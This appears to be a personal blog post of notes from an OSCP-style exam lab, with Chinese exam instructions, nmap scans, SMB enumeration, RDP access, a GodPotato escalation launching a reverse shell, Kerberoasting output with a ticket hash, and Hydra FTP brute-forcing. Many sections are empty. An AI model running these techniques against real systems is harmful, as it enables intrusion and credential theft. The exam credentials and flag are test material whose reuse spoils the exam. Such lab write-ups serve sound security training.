---
title: OSCP Exam 1
date: 2026-01-16
draft: false
ShowToc: true
password: thankshaydon
TocOpen: true
tags:
  - blog
  - offsec
lastmod: 2026-07-24T06:55:17.060Z
---
## main

# Box OSCP Info

```
目標 IP：172.16.137.200
--------------------------------------

最高潛在得分：40

您已與客戶達成協議，將對其 Microsoft Windows Active Directory 基礎架構執行假設入侵場景滲透測試。您可以使用下列憑證存取 oscp.exam 網域中的 WS26 用戶端電腦。

使用者名稱：r.andrews

密碼：BusyOfficeWorker890

Active Directory 滲透測試的最終目標是取得網路上的網域管理員等級權限。 Active Directory 網路位於下列 IP 位址：

172.16.137.200

172.16.137.202

192.168.137.206

主要目標：

- 取得對 WS26 用戶端電腦的管理員互動式存取權限，並以有效方式取得 proof.txt 檔案（注意：不存在 local.txt 檔案）。

- 取得 SRV22 用戶端電腦的管理員互動式存取權限，並以合法方式取得 proof.txt 檔案。請注意，不存在 local.txt 檔案。

- 取得網域控制站 (DC20) 的管理員互動式存取權限，並以合法方式取得 proof.txt 檔案。請注意，不存在 local.txt 檔案。

- 在控制面板中提交 proof.txt 檔案。

文件要求：

- 以可複製/貼上的方式記錄攻擊的每個步驟和命令。

- 建立螢幕截圖，顯示所執行攻擊的各個步驟和階段。

- 建立有效的螢幕截圖，顯示 proof.txt 檔案的內容和電腦 IP 位址。

- 提供所用腳本/漏洞利用程式的連結或副本。

- 記錄對所用原始腳本或漏洞利用程式所做的任何變更。

- 提供在已執行的攻擊和利用過程中發現的漏洞的摘要和概述。您必須展示針對用於取得網域管理員權限的整個 Active Directory 網域執行的所有步驟。

重要：無法還原單一電腦；還原任何一台 AD 集電腦都會還原整個 AD 網路。還原後請等待 5 分鐘，以確保所有服務正常運作。完整的還原過程可能需要 5-7 分鐘。

請注意，並非所有計算機都會回應 ICMP/ping 請求。

Active Directory 集與獨立電腦之間不存在任何相依性。

目標 IP：192.168.137.110
--------------------------------------

最高分：20

主要目標：

- 以合法方式取得目標機器的互動式存取權限並取得 local.txt 文件

- 在控制面板中提交 local.txt 文件

- 以合法方式取得目標機器的互動式存取權限並取得 proof.txt 文件

- 在控制面板中提交 proof.txt 文件

文件要求：

- 以可複製/貼上的方式記錄攻擊的每個步驟和命令

- 建立螢幕截圖，展示攻擊的各個步驟和階段

- 建立有效的螢幕截圖，顯示 local.txt 檔案的內容和目標機器的 IP 位址

- 建立有效的螢幕截圖，顯示 proof.txt 檔案的內容和目標機器的 IP 位址

- 提供所用腳本/漏洞利用程式的連結或副本

- 記錄對原始腳本或漏洞程式所做的任何更改

- 提供對發現的漏洞、執行的攻擊和利用過程的總結和概述

目標 IP： 192.168.137.111

--------------------------------------

最高分：20

主要目標：

- 以合法方式取得目標機器的互動式存取權限並取得 local.txt 文件

- 在控制面板中提交 local.txt 文件

- 以合法方式取得目標機器的互動式存取權限並取得 proof.txt 文件

- 在控制面板中提交 proof.txt 文件

文件要求：

- 以可複製/貼上的方式記錄攻擊的每個步驟和命令

- 建立螢幕截圖，展示攻擊的各個步驟和階段

- 建立有效的螢幕截圖，顯示 local.txt 檔案的內容和目標機器的 IP 位址

- 建立有效的螢幕截圖，顯示 proof.txt 檔案的內容和目標機器的 IP 位址

- 提供所用腳本/漏洞利用程式的連結或副本

- 記錄對原始腳本或漏洞程式所做的任何更改

- 提供對發現的漏洞、已執行的攻擊和利用過程的總結和概述

目標 IP： 192.168.137.112

--------------------------------------

最高分：20

主要目標：

- 以合法方式取得機器的互動式存取權限並取得 local.txt 文件

- 在控制面板中提交 local.txt 文件

- 以合法方式取得機器的互動式存取權限並取得 proof.txt 文件

- 在控制面板中提交 proof.txt 文件

文件要求：

- 以可複製/貼上的方式記錄攻擊的每個步驟和命令

- 建立螢幕截圖，展示攻擊的各個步驟和階段

- 建立有效的螢幕截圖，顯示 local.txt 檔案的內容和機器 IP 位址

- 建立有效的螢幕截圖，顯示 proof.txt 檔案的內容和機器 IP 位址

- 提供
```

# Recon 192.168.137.206

### \[\[PORT & IP SCAN]]

```
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.137.206 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 12:50 +0800
Nmap scan report for 192.168.137.206
Host is up (0.23s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: WS26
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: WS26.oscp.exam
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.22621
|_  System_Time: 2024-11-13T11:38:37+00:00
| ssl-cert: Subject: commonName=WS26.oscp.exam
| Not valid before: 2024-11-12T11:04:26
|_Not valid after:  2025-05-14T11:04:26
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=1/17%Time=696B151E%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-13T11:38:39
|_  start_date: N/A
|_clock-skew: mean: -429d17h12m10s, deviation: 0s, median: -429d17h12m11s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.70 seconds


---
─# sudo nmap -sU --top-port=20 192.168.137.206

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 12:53 +0800
Nmap scan report for 192.168.137.206
Host is up (0.22s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds

```

### \[\[SMB 445]] --Scan

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
└─# nxc smb 192.168.137.206/24 -u 'r.andrews' -p 'BusyOfficeWorker890' --shares

[*] Initializing SMB protocol database
SMB         192.168.137.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:OSCP) (signing:False) (SMBv1:False) 
SMB         192.168.137.206 445    WS26             [*] Windows 11 Build 22621 x64 (name:WS26) (domain:oscp.exam) (signing:False) (SMBv1:False) 
SMB         192.168.137.111 445    OSCP             [-] OSCP\r.andrews:BusyOfficeWorker890 STATUS_LOGON_FAILURE 
SMB         192.168.137.206 445    WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 
SMB         192.168.137.206 445    WS26             [*] Enumerated shares
SMB         192.168.137.206 445    WS26             Share           Permissions     Remark
SMB         192.168.137.206 445    WS26             -----           -----------     ------
SMB         192.168.137.206 445    WS26             ADMIN$                          Remote Admin
SMB         192.168.137.206 445    WS26             C$                              Default share
SMB         192.168.137.206 445    WS26             IPC$            READ            Remote IPC
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                                     
```

### 3389

```shell
└─#  xfreerdp /u:'r.andrews' /p:'BusyOfficeWorker890'  /v:192.168.137.206 /dynamic-resolution /drive:./tools  /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
[12:59:35:462] [1609378:1609383] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[12:59:35:462] [1609378:1609383] [WARN][com.freerdp.crypto] - CN = WS26.oscp.exam
[12:59:39:583] [1609378:1609383] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[12:59:39:583] [1609378:1609383] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[12:59:39:690] [1609378:1609383] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[12:59:39:691] [1609378:1609502] [INFO][com.freerdp.channels.rdpdr.client] - Loading device service drive [linux] (static)
[12:59:39:691] [1609378:1609383] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[12:59:39:691] [1609378:1609383] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[12:59:41:522] [1609378:1609383] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
[12:59:42:690] [1609378:1609502] [INFO][com.freerdp.channels.rdpdr.client] - registered device #1: linux (type=8 id=1)
[12:59:42:093] [1609378:1609383] [WARN][com.freerdp.core.rdp] - pduType PDU_TYPE_DATA not properly parsed, 562 bytes remaining unhandled. Skipping.


```

![Pasted image 20260117130039.png](/ob/Pasted%20image%2020260117130039.png)

![Pasted image 20260117130354.png](/ob/Pasted%20image%2020260117130354.png)

![Pasted image 20260117130420.png](/ob/Pasted%20image%2020260117130420.png)

```
chmod +x ./proxy && sudo ./proxy -laddr 0.0.0.0:11601 -selfcert -v
```

![Pasted image 20260117130752.png](/ob/Pasted%20image%2020260117130752.png)

![Pasted image 20260117130839.png](/ob/Pasted%20image%2020260117130839.png)

![Pasted image 20260117130947.png](/ob/Pasted%20image%2020260117130947.png)

***

## Windows privilege escalation (MS01 to be edit)

### \[\[whoami priv]]

![Pasted image 20260117131127.png](/ob/Pasted%20image%2020260117131127.png)

![Pasted image 20260117132401.png](/ob/Pasted%20image%2020260117132401.png)

https://github.com/BeichenDream/GodPotato

```
.\GodPotato-NET4.exe -cmd "reverse.exe"
```

![Pasted image 20260117140945.png](/ob/Pasted%20image%2020260117140945.png)

![Pasted image 20260117141043.png](/ob/Pasted%20image%2020260117141043.png)

![Pasted image 20260117141209.png](/ob/Pasted%20image%2020260117141209.png)

***

> 擁有了第一部機器的最高限權 ,然後需要考慮橫向移動,這裏是為了製造橫向移動的立足點

## AD Recon WS26  Administrator To SRV22 172.16.137.200

```
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49701/tcp open  unknown
```

```
PS C:\Users\r.andrews\Desktop> Get-NetDomain
Get-NetDomain


Forest                  : oscp.exam
DomainControllers       : {DC20.oscp.exam}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : DC20.oscp.exam
RidRoleOwner            : DC20.oscp.exam
InfrastructureRoleOwner : DC20.oscp.exam
Name                    : oscp.exam

```

### \[\[Mimikatz]]

```
```

### \[\[Kerberoasting]]

![Pasted image 20260117170941.png](/ob/Pasted%20image%2020260117170941.png)

```
PS C:\Users\r.andrews\Desktop> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\Kerberoasting.csv -NoTypeInformation
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\Kerberoasting.csv -NoTypeInformation
PS C:\Users\r.andrews\Desktop> cat Kerberoasting.csv
cat Kerberoasting.csv
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"krbtgt","CN=krbtgt,CN=Users,DC=oscp,DC=exam","kadmin/changepw",,"$krb5tgs$18$*krbtgt$oscp.exam$kadmin/changepw*$E86CFB1C38C4A5A210DB0AFDCA2B565A$783E002D1B1560458C0E63957C50DFFB16CE541E04BADB5582C377C0B560737EEBBA37FEB26FD4E3F591BF1CD30F1B5BC684B666DE45CD1C4FE02766531BFA9F2D1E16DB51E7A53D7F39ED460EEB893DCD2023E438A7223F4352113B235924B86ED35043C6BBED552AD82146894D2ABA380B9B760550035E2ED588642B16F7464AE0178B3AB63DA5DE6B23FE10E808C81015B809BC5940769C659DDC1C49F4D2C880DD4FF4620DC1023217EF1A6588AA3CF8843402B510D438F8A826069801191EEACB3AD21B2BCF83A76AA2D137718DDD8B6E0F4B3C52D69BB6819D3B3E31775672D9B2413A5E15CCEACE23E9BB29EED909EDC8C69D9A46B4B815D3688786005A4425860E20D0D5CBA07B61FEB30F3ABB0E18AFD3BCB72866670C2C6DAC926221BA5495BEC3E20BE363C5964A17B3496FB1EF69F1F26FDFCC4FF5D888A86EE744F34A74FFE542619FEA9034D02FD128375D5FAB336BEA4CCE63CBB32FC3C859951B38F9B6D49F9F7EF2C6BDF47E2F954E498AF0BAAB0D959F91C6D450F56AFB30633E968D778E37CD1004EC622AF28B369312BE36C4C4039F6B71F478EF74C1E439D3BA0312FF74FB6B96238046BC3F276CE3DD54A810254EEA6D43829069B8F2FE50D2B68E0B0B635FF8FFD9701CC40E065D22C161759C6C1B615237527E052C3DF757025C0A316E36C55AAF1B47BC07388C8B50FA22556371FE93359761F07DD5508DE5092546EBB813E5BC79B9CE7975E10FD2D56D2F425960B865853966384D03B55289A233AE65E892A9B7AC29E0EDF02D8626EE37FD472B612AD5C6CAA71738B74EC85FE274D66CAAF2AC0D1E90CB62CB870240959F41CFA2D7E65F9134B7B23B67873CE8BD12D66D25EF18F465251994414B489D0F2B7BE9FE8A7E02EB752E5D397D1BAC43C2DAD8ACA7BA51010CD4326E78A938A90C0395B5B54279F451F92BBC263569B290537A59CB5A4D950DAC4D24951FC5F868DE77BB0E83CEAD972CDC01AC0149465AE21DDF009C13FA571611A35B159FF34EDC0BD044B09F2B304B39C74CC20C463DC2A7B8A5D160AC5091DA2E62F1EF3BA175A3854911422BFEE051E596E31E30F79B6344547E682A6C0E8252D389AB8B168AF5C24ED548DC48DAFE94DB347C7DC464F83E0E8D8528435F9E024057EB3395586B1F72D6819C03BA5F89E1D5223475167F3EF497618D8B1DEFECF2A051B24CC8312388A161D06C99F55C3BDA5B013A26E712A10B6BC263B9868527C440C4D3D875DD8655E7B23A8C0A90A398FC0D626C74BA33B351EA259324847AC99AC2A6B2FF6C40488A71CDB1868C45822A000C5423DC513A754AF41913FFE9449E0DE0C6AA1896131EF34E45766A889DCC8DC78C925F5139FC34EDA588EF5F537D58F19D103D2792BCC4E5CAA126818A7301F4A3CCCF89A7121703B9628EFC8F0D83647F5E04ABA0E2D047F935093CD02663E3FB182ED5E87215CBEBED3614E0ECC6E069E49C"

```

![Pasted image 20260117155828.png](/ob/Pasted%20image%2020260117155828.png)

***

# Recon 192.168.137.110

### \[\[PORT & IP SCAN]]

```

└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.137.110 -oN serviceScan.txt

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 16:53 +0800
Nmap scan report for 192.168.137.110
Host is up (0.23s latency).

PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.5
22/tcp open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a7:09:ae:7c:78:41:c7:a8:b4:41:17:20:f5:cd:15:75 (ECDSA)
|_  256 6c:fc:3e:2e:95:6a:54:1e:98:89:0e:c9:97:69:10:b9 (ED25519)
53/tcp closed domain
80/tcp open   http     Apache httpd 2.4.52
|_http-title: Index of /
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.01 seconds

---
168.137.110

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 16:54 +0800
Nmap scan report for 192.168.137.110
Host is up (0.23s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds

```

### \[\[FTP 21]] -- Scans

* 匿名登入
* 爆破登入

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-17 18:14:50
[DATA] max 4 tasks per 1 server, overall 4 tasks, 66 login tries, ~17 tries per task
[DATA] attacking ftp://192.168.137.110:21/
[ATTEMPT] target 192.168.137.110 - login "anonymous" - pass "anonymous" - 1 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.137.110 - login "root" - pass "rootpasswd" - 2 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.137.110 - login "root" - pass "12hrs37" - 3 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.137.110 - login "ftp" - pass "b1uRR3" - 4 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.137.110 - login "admin" - pass "admin" - 5 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.137.110 - login "localadmin" - pass "localadmin" - 6 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.137.110 - login "admin" - pass "1234" - 7 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.137.110 - login "apc" - pass "apc" - 8 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.137.110 - login "Root" - pass "wago" - 10 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.137.110 - login "Admin" - pass "wago" - 11 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.137.110 - login "User" - pass "user" - 12 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.137.110 - login "Guest" - pass "guest" - 13 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.137.110 - login "ftp" - pass "ftp" - 14 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.137.110 - login "a" - pass "avery" - 16 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.137.110 - login "adtec" - pass "none" - 18 of 66 [child 3] (0/0)
[21][ftp] host: 192.168.137.110   login: ftp   password: ftp
[ATTEMPT] target 192.168.137.110 - login "none" - pass "dpstelecom" - 20 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.137.110 - login "instrument" - pass "instrument" - 21 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.137.110 - login "user" - pass "password" - 22 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.137.110 - login "default" - pass "default" - 24 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.137.110 - login "nmt" - pass "1234" - 26 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.137.110 - login "supervisor" - pass "supervisor" - 28 of 66 [child 3] (0/0)
```

```
└─#  ftp 192.168.137.110

Connected to 192.168.137.110.
220 (vsFTPd 3.0.5)
Name (192.168.137.110:root): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
ftp> cd ..
l250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-x---    2 1002     1003         4096 Jul 09  2024 clay
drwxr-x---    3 1001     1002         4096 Apr 06  2023 ftp
drwxrwxrwx    4 1000     1000         4096 Apr 06  2023 lisa
226 Directory send OK.
ftp> cd lisa
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
lrwxrwxrwx    1 0        0               9 Apr 06  2023 .bash_history -> /dev/null
-rw-r--r--    1 1000     1000          220 Jan 06  2022 .bash_logout
-rw-r--r--    1 1000     1000         3771 Jan 06  2022 .bashrc
drwx------    2 1000     1000         4096 Apr 06  2023 .cache
lrwxrwxrwx    1 0        0               9 Apr 06  2023 .mysql_history -> /dev/null
-rw-r--r--    1 1000     1000          807 Jan 06  2022 .profile
drwx------    2 1000     1000         4096 Apr 06  2023 .ssh
-rw-r--r--    1 1000     1000           33 Jan 17 10:11 local.txt
226 Directory send OK.
ftp> get local.txt
local: local.txt remote: local.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for local.txt (33 bytes).
100% |***********************************************************************|    33      146.48 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.12 KiB/s)
ftp> 

```

![Pasted image 20260117182430.png](/ob/Pasted%20image%2020260117182430.png)

```
└─# cat local.txt
4a8dbbd6ee87fd7acf2bc6f395b19454
                                             
```

### \[\[SSH 22]] -- Scans

* 爆破登入

> 如果允許任何爆破登入，這可能是取得檔和其他資訊的最佳位置。

```
ftp ftp 
```

# Linux privilege escalation (MS01 to be edit)

### sudo -l

```
```

### ls -al /etc/cron\*

```
```

### find / -perm -4000 -type f -ls 2>/dev/null

```
```

### ls /opt ,  ls /home  ls /mnt  ls /backup

```
```

### ps auxwwww , timeout 60 ./pspy64 -pf -i 1000

```
```

### linpeas

```
```

***

***

# Recon 192.168.137.111

### \[\[PORT & IP SCAN]]

```
ORT      STATE SERVICE       VERSION
80/tcp    open  http          BarracudaServer.com (Windows)
|_http-server-header: BarracudaServer.com (Windows)
| http-webdav-scan: 
|   Server Date: Sat, 17 Jan 2026 10:08:51 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   Server Type: BarracudaServer.com (Windows)
|_  WebDAV type: Unknown
|_http-title: Home
| http-methods: 
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| fingerprint-strings: 
|   FourOhFourRequest, GenericLines: 
|     HTTP/1.1 200 OK
|     Date: Sat, 17 Jan 2026 10:06:11 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 17 Jan 2026 10:06:03 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 17 Jan 2026 10:06:04 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 17 Jan 2026 10:06:05 GMT
|     Server: BarracudaServer.com (Windows)
|_    Connection: Close
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/https     BarracudaServer.com (Windows)
|_http-server-header: BarracudaServer.com (Windows)
|_ssl-date: 2026-01-17T10:08:56+00:00; -1s from scanner time.
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
| Not valid before: 2009-08-27T14:40:47
|_Not valid after:  2019-08-25T14:40:47
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-17T10:08:56+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: OSCP
|   DNS_Computer_Name: OSCP
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-17T10:08:32+00:00
| ssl-cert: Subject: commonName=OSCP
| Not valid before: 2026-01-16T04:11:22
|_Not valid after:  2026-07-18T04:11:22
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5432/tcp  open  postgresql    PostgreSQL DB 9.6.0 or later
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.98%I=7%D=1/17%Time=696B5F0C%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2017\x20Jan\x202026
SF:\x2010:06:03\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r
SF:\nConnection:\x20Close\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\x20
SF:OK\r\nDate:\x20Sat,\x2017\x20Jan\x202026\x2010:06:04\x20GMT\r\nServer:\
SF:x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n"
SF:)%r(RTSPRequest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2017\x20Ja
SF:n\x202026\x2010:06:05\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Wi
SF:ndows\)\r\nConnection:\x20Close\r\n\r\n")%r(FourOhFourRequest,72,"HTTP/
SF:1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2017\x20Jan\x202026\x2010:06:11\x20
SF:GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x2
SF:0Close\r\n\r\n")%r(GenericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20
SF:Sat,\x2017\x20Jan\x202026\x2010:06:11\x20GMT\r\nServer:\x20BarracudaSer
SF:ver\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-17T10:08:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.65 seconds


---
└─# sudo nmap -sU --top-port=20 192.168.137.111

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 20:56 +0800
Nmap scan report for 192.168.137.111
Host is up (0.23s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

                                                                         
```

### \[\[SMB 445]] --Scan

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
```

### \[\[NFS 2049]] -- Scans

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
```

### \[\[MSSQL 1433]] -- Scans

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
```

### \[\[MYSQL 3306]] -- Scans

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
```

### \[\[Unkown Port]] -- Scans

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
```

***

# Recon 192.168.137.112

### \[\[PORT & IP SCAN]]

```
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.137.112 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 20:39 +0800
Nmap scan report for 192.168.137.112
Host is up (0.23s latency).

PORT     STATE SERVICE  VERSION
